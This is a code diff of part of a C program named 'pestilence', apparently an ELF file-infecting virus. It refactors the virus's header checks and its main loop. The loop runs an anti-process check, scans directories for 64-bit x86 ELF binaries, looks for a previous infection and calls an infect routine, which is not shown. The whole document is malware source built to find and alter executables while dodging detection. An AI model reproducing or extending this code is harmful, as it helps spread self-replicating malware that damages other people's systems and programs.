@@ -2,22 +2,20 @@
 
 int     ft_readelf(t_pestilence *pestilence)
 {
-    pestilence->valide = 1;
     pestilence->elf = mmap(NULL, pestilence->file_info.st_size, PROT_READ, MAP_PRIVATE, pestilence->fd, 0);
     if (pestilence->elf == MAP_FAILED)
     {
         close(pestilence->fd);
         return (-1);
     }
-    if (pestilence->file_info.st_size >= 4 && pestilence->elf[0] == 0x7F && pestilence->elf[1] == 'E' && pestilence->elf[2] == 'L' && pestilence->elf[3] == 'F')
+    if (pestilence->file_info.st_size >= 4 && pestilence->elf[0] == 0x7f && pestilence->elf[1] == 'E' && pestilence->elf[2] == 'L' && pestilence->elf[3] == 'F')
     {
         pestilence->file_size = pestilence->file_info.st_size;
         pestilence->header = (Elf64_Ehdr *)pestilence->elf;
-        if ((pestilence->header->e_ident[EI_CLASS] == ELFCLASS64) && (pestilence->header->e_machine == EM_X86_64))
-            pestilence->valide = 1;
+        if ((pestilence->header->e_ident[EI_CLASS] == ELFCLASS64) && pestilence->header->e_machine == EM_X86_64)
+            return (0);
         else
         {
-            pestilence->valide = 0;
             close(pestilence->fd);
             return (-1);
         }
@@ -30,7 +28,7 @@ int     ft_readelf(t_pestilence *pestilence)
     return (0);
 }
 
-int ft_checkarg(t_pestilence *pestilence)
+int     ft_checkarg(t_pestilence *pestilence)
 {
     pestilence->fd = open(pestilence->binary, O_RDONLY);
     if (pestilence->fd == -1)
@@ -45,7 +43,7 @@ int ft_checkarg(t_pestilence *pestilence)
         close(pestilence->fd);
         return (-1);
     }
-    return (ft_readelf(pestilence));
+    return(ft_readelf(pestilence));
 }
 
 int main()
@@ -61,24 +59,27 @@ int main()
         return (1);
     pestilence->anti_virus = 0;
     ft_antiprocess(pestilence);
+
     if (!pestilence->anti_virus)
     {
         while (i < 2)
         {
             pestilence->dir = opendir(ft_getdir(i));
-            while ((pestilence->readdir = readdir(pestilence->dir)) != NULL)
+            if (pestilence->dir)
             {
-                snprintf(path, sizeof(path), "%s/%s", ft_getdir(i), pestilence->readdir->d_name);
-                if (pestilence->readdir->d_name[0] == '.')
-                    continue;
-                pestilence->binary = path;
-                if (ft_checkarg(pestilence))
-                    continue;
-                ft_pointer_section_table(pestilence);
-                ft_pointer_strings_table(pestilence);
-                if (ft_detect_prev_infection(pestilence))
-                    ft_infect(pestilence);
-    
+                while ((pestilence->readdir = readdir(pestilence->dir)) != NULL)
+                {
+                    snprintf(path, sizeof(path), "%s/%s", ft_getdir(i), pestilence->readdir->d_name);
+                    if (pestilence->readdir->d_name[0] == '.')
+                        continue;
+                    pestilence->binary = path;
+                    if (ft_checkarg(pestilence))
+                        continue;
+                    pestilence->sectab = (Elf64_Shdr *)(pestilence->elf + pestilence->header->e_shoff);
+                    pestilence->strtab = (char *)(pestilence->elf + pestilence->sectab[pestilence->header->e_shstrndx].sh_offset);
+                    if (ft_detect_prev_infection(pestilence))
+                        ft_infect(pestilence);
+                }
             }
             closedir(pestilence->dir);
             i++;
